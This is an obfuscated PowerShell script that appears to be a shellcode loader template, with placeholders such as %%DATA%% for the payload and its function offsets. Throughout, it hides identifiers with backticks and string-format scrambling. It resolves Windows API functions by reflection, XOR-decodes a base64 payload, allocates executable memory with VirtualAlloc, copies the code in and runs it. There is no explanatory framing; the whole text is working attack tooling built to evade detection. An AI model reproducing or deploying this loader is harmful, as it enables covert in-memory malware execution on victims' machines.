SEt-STR`i`c`TmodE -Version 2

function fu`N`c`_G`Et_PrOC_adDresS {
	Param (${vAR_m`Od`UlE}, ${VAr`_P`ROcEd`U`Re})		
	${VaR_u`N`s`AFE_NATiV`e_`ME`ThO`dS} = ([AppDomain]::"CuRrE`N`TdOm`Ain".("{3}{1}{0}{4}{2}"-f'sem','etAs','es','G','bli').Invoke() | W`HERe-`Ob`JECT { ${_}."GL`OBALaSs`embly`cacHe" -And ${_}."l`oc`AtION".("{0}{1}"-f 'Sp','lit').Invoke('\\')[-1].("{0}{1}"-f 'Eq','uals').Invoke(("{0}{2}{1}" -f'Sys','m.dll','te')) }).("{2}{0}{1}" -f 'tTy','pe','Ge').Invoke(("{8}{0}{7}{3}{1}{2}{4}{6}{5}"-f 'icr','n32.Unsafe','Native','.Wi','Me','s','thod','osoft','M'))
	${VAR_`GPa} = ${v`AR_UnSa`Fe`_n`Ative_mEtHodS}.("{2}{1}{0}"-f 'ethod','tM','Ge').Invoke(("{1}{0}{2}" -f 'Pro','Get','cAddress'), [Type[]] @(("{6}{4}{0}{2}{1}{5}{3}{7}" -f'em','.InteropServi','.Runtime','s.H','t','ce','Sys','andleRef'), ("{2}{1}{0}"-f'g','rin','st')))
	return ${va`R_`gpA}."IN`VoKe"(${Nu`LL}, @([System.Runtime.InteropServices.HandleRef](ne`w-`oBJecT ('S'+'ystem'+'.Ru'+'nti'+'me.In'+'t'+'eropServices.Handl'+'eRe'+'f')((NE`W-O`BJecT ('Int'+'Pt'+'r')), (${Var_uNsa`F`E_N`At`iVE_METHO`ds}.("{1}{0}"-f 'etMethod','G').Invoke(("{1}{3}{0}{2}" -f 'oduleHa','Ge','ndle','tM')))."i`N`VOke"(${nu`lL}, @(${vAr`_Mo`dULe})))), ${vaR`_PRo`C`edU`Re}))
}

function Fu`Nc`_`GeT_Del`Ega`TE`_tYPe {
	Param (
		[Parameter(poSITiOn = 0, maNdaToRy = ${Tr`Ue})] [Type[]] ${VAr`_`PaRaM`etErS},
		[Parameter(pOsITIon = 1)] [Type] ${VaR_Re`TurN_`TY`pE} = [Void]
	)

	${VAR_`T`ypE_BUilD`ER} = [AppDomain]::"c`UrRe`NtDOMAIn".("{5}{1}{0}{4}{3}{2}"-f'Dy','ne','ssembly','cA','nami','Defi').Invoke((Ne`W-O`BJ`ecT ('Syste'+'m.Ref'+'lec'+'ti'+'on.As'+'semb'+'ly'+'Na'+'me')(("{4}{2}{0}{3}{1}"-f'ect','te','efl','edDelega','R'))), [System.Reflection.Emit.AssemblyBuilderAccess]::"R`UN").("{3}{2}{0}{5}{4}{1}"-f 'i','ule','ynam','DefineD','od','cM').Invoke(("{2}{1}{0}{3}{4}" -f 'o','Mem','In','ryM','odule'), ${f`Al`SE}).("{2}{1}{0}"-f 'eType','fin','De').Invoke(("{1}{0}{2}{3}"-f 'egat','MyDel','eTyp','e'), ("{2}{5}{0}{1}{6}{8}{11}{3}{10}{4}{7}{12}{9}"-f'P','ublic, ','Clas','siClass, ','t','s, ','S','oCla','ealed,','s','Au',' An','s'), [System.MulticastDelegate])
	${var_tYP`E_`BU`ildeR}.("{2}{0}{1}{3}" -f 'fine','Construct','De','or').Invoke(("{0}{1}{3}{5}{4}{2}" -f'R','TSpecialName, ','ic','Hid',' Publ','eBySig,'), [System.Reflection.CallingConventions]::"Sta`NDArD", ${V`A`R`_parAmeTe`RS}).("{3}{4}{1}{2}{0}"-f 'nFlags','t','atio','SetImpl','emen').Invoke(("{1}{0}{2}"-f'time, Manage','Run','d'))
	${Var_`TY`pE_bu`ilDER}.("{3}{0}{1}{2}"-f 'efin','e','Method','D').Invoke('Invoke', ("{7}{6}{4}{9}{2}{0}{8}{3}{5}{1}" -f'e','Virtual','Sig, N','ot,',', ',' ','ic','Publ','wSl','HideBy'), ${v`A`R_REt`URn_tYpe}, ${vAR_`pa`R`AMeteRs}).("{3}{2}{4}{0}{5}{1}" -f'n','ags','nt','SetImpleme','atio','Fl').Invoke(("{2}{0}{3}{4}{1}" -f' M','d','Runtime,','ana','ge'))

	return ${VAR`_TY`P`e_buiL`d`ER}.("{1}{0}{2}"-f'reate','C','Type').Invoke()
}

If ([IntPtr]::"S`Ize" -eq 8) {
	[Byte[]]${V`AR_Code} = [System.Convert]::("{4}{2}{3}{1}{0}" -f'g','64Strin','a','se','FromB').Invoke(('%%DATA%%'))

	for (${X} = 0; ${X} -lt ${vA`R_`cOde}."cO`UNt"; ${x}++) {
		${vAR`_cOdE}[${X}] = ${v`AR`_cOdE}[${x}] -bxor 42
	}

	[Byte[]]${F`UN`C`_GMH} = [BitConverter]::("{1}{0}{2}"-f 'tB','Ge','ytes').Invoke((fUnc_G`Et_Pr`oc`_A`dDre`SS ('ker'+'n'+'el32') ('G'+'e'+'tModuleHa'+'ndleA')).("{0}{1}{2}"-f 'T','oInt','64').Invoke())
	[Byte[]]${fUn`C`_gpa} = [BitConverter]::("{0}{1}"-f'GetB','ytes').Invoke((FU`N`c_gEt_`pROC_ADd`Ress ('kernel3'+'2') ('GetProc'+'Ad'+'dr'+'e'+'ss')).("{0}{2}{1}"-f 'ToI','t64','n').Invoke())
	[Array]::("{1}{0}" -f 'opy','C').Invoke(${f`UnC_Gmh}, 0, ${VAR_c`o`De}, %%GMH_OFFSET%%, ${FUNc`_`gMh}."Le`NgtH")
	[Array]::("{0}{1}"-f 'C','opy').Invoke(${fUNc_g`pa}, 0, ${vA`R_Co`DE}, %%GPA_OFFSET%%, ${F`U`NC_Gpa}."lE`NgtH")

	${Var_`Va} = [System.Runtime.InteropServices.Marshal]::("{5}{3}{4}{0}{2}{1}"-f'orFuncti','ter','onPoin','legate','F','GetDe').Invoke((Fun`C_gET`_P`R`oc_a`dDRESs ('kernel'+'3'+'2.dl'+'l') ('Vir'+'tual'+'All'+'oc')), (Fu`Nc`_G`et_dE`leg`ATE_t`YPe @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	${V`AR_`BuF`FEr} = ${v`AR_`Va}."In`VOKe"([IntPtr]::"z`eRo", ${VAR_c`o`dE}."leNG`TH", 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::("{0}{1}" -f'Co','py').Invoke(${VA`R_C`oDe}, 0, ${Va`R_buf`FER}, ${vaR`_CODE}."l`enGtH")

	${VA`R_RUN`mE} = [System.Runtime.InteropServices.Marshal]::"G`eTDeleg`ATefoRFUnc`TIONP`Oin`TEr"(${vA`R_BUFF`er}, (FuN`c`_geT_DElegAt`E_TY`pE @([IntPtr]) ([Void])))
	${vAR`_Run`ME}."In`V`oKE"([IntPtr]::"z`ERo")
}

